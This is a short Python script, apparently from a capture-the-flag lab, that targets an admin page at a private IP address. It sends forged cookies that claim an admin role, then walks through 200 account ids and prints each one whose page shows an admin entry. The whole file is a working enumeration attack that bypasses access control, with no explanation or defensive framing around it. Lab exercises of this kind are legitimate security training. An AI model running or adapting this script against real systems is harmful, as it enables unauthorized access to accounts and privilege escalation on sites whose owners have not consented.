import requests

URL = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="
COOKIES = dict(user='34322', role='admin')

for i in range(200):
    attempt = URL + str(i)
    response = requests.get(url=attempt, cookies=COOKIES).content
    if "admin</td>" in str(response):
        print("Found some admin with id " + str(i))